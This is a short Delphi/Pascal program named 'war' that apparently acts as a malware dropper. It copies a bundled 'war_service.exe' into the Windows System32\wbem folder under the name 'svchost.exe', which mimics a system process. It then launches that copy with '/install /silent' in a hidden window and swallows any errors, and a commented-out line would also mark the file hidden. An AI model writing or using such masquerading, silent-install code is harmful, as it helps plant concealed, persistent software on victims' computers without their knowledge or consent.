program war;

//{$APPTYPE CONSOLE}

uses
  Messages, Windows, SysUtils, shellapi, registry, forms, Dialogs;

const
  path = 'C:\Windows\System32\wbem\';
  exename = 'svchost.exe';

var
  programpath: string;

procedure CopyToPath;
begin
  try
    if not DirectoryExists(path) then
      mkdir(path);

    if not fileexists(path+exename) then
      copyfile(pchar(extractfilepath(programpath)+'war_service.exe'), path+exename, true);
//    FileSetAttr(path+exename, faHidden);
//    shellexecute(0, 'open', path+exename, '/install', path, 0);
    shellexecute(0, 'open', path+exename, '/install /silent', path, 0);
  except

  end;
end;

begin
  programpath := application.ExeName;
  CopyToPath;
end.
